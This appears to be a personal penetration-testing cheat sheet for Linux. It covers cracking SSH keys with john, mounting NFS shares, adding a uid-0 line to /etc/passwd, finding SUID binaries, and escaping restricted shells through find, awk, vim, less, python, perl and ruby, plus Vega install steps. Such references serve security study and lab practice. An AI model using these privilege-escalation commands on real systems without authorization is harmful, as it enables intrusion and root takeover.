---
layout: default
---
<< [Home](./)

# Linux Index
* [Useful Commands](#Commands)
* [Privilege Escalation](#Privilege-Escalation)
* [Remote shells](#Remote-Shells)
* [Installations](#Installations)

## Useful Commands

### SSH

Connect using key and (try) access bash shell directly.
```bash
ssh -i [key_file] [user]@[ip] -t "/bin/sh"
```
Convert key to crackable (with john) format, using ssh2john (/usr/share/john/ssh2john.py in Kali).
```bash
python ssh2john.py [key_file] > [crackable.txt]
```
Then crack with john...
```bash
john --wordlist=[list.txt] [crackable.txt]
```

### NFS

Show shared directories from nfs server.
```bash
showmount -e {[ip] | [hostname]}
```

Mount share to temporary local directory.
```bash
mkdir /tmp/nfs-share
mount -t nfs [ip]:/shared/path /tmp/nfs-share
```


### Other

Create group with specific gid.
```bash
groupadd --gid [gid] [group_name]
```
Create user with specific uid and add to specific group.
```bash
useradd --uid [uid] --group [group_name] [username]
```

Start a simple http server with python.
```bash
python -m SimpleHTTPServer
```

Generate hashed password for passwd.
```bash
openssl passwd -1 [password]
```
(Could be used to add new user to passwd file...)
```bash
usserr:[hash]:0:0:root:/root:/bin/bash
```

## Privilege Escalation<a name="Privilege-Escalation"></a>

List available sudo commands.
```bash
sudo -l
```

Find files with SUID bit set.
```bash
find / -perm -u=s -type f 2>/dev/null
```
### Find

Execute forbidden commands with find -exec. (Can work in rbash, rzsh, rksh. Not lshell).
```bash
find . -name file.txt -exec awk 'BEGIN {system("cd /root; ls")}' \;
```

### AWK

Execute commands using system() function.
```bash
awk 'BEGIN {system("/bin/sh")}'
```

### VIM

Launch shell in vim.
```bash
:!/bin/sh
```
Alt.
```bash
:set shell=/bin/sh
:shell
```

### ed

Launch shell within ed.
```bash
!'/bin/sh'
```

### More & Less

Launch shell within more or less.
```bash
!'sh'
```

### Man & pinfo

Execute commands within man and pinfo pages.
```bash
!
```

### Python

Example:
```bash
sudo -u user1 python
>>>from subprocess import call
>>>call('/bin/bash', shell=True)
```
Alt.
```bash
python -c 'import os; os.system("/bin/sh");'
```
Alt2.
```bash
python -c 'import pty; pty.spawn("/bin/sh")'
```

### Perl

Example:
```bash
sudo -u user1 perl -e '`/bin/bash`'
```

### Ruby

Example:
```bash
sudo -u user1 ruby -e 'require "irb" ; IRB.start(__FILE__)'
`uname`
```

## Installations & Troubleshooting<a name="Installations"></a>

### Vega on Kali

As described in [this video](https://youtu.be/E5WePDXTdng).

1. Download and extract [Vega](https://subgraph.com/vega/download/).
1. Make sure java-8-openjdk is selected:
```bash
update-alternatives --config java
```
1. Make sure the /etc/apt/sources.list contains the following two lines:
```bash
deb http://http.kali.org/kali kali-rolling main non-free contrib
deb http://kali.mirror.garr.it/mirrors/kali kali-rolling main non-free contrib
```
1. Install libwebkitgtk:
```bash
sudo apt-get install libwebkitgtk-1.0
```
1. Notice the
```bash
"Note, selecting 'libwebkitgtk-1.0-0' for regex 'libwebkitgtk-1.0'"
```
1. Update
```bash
sudo apt-get update
```
1. Repeat:
```bash
sudo apt-get install libwebkitgtk-1.0
```
1. Run Vega.
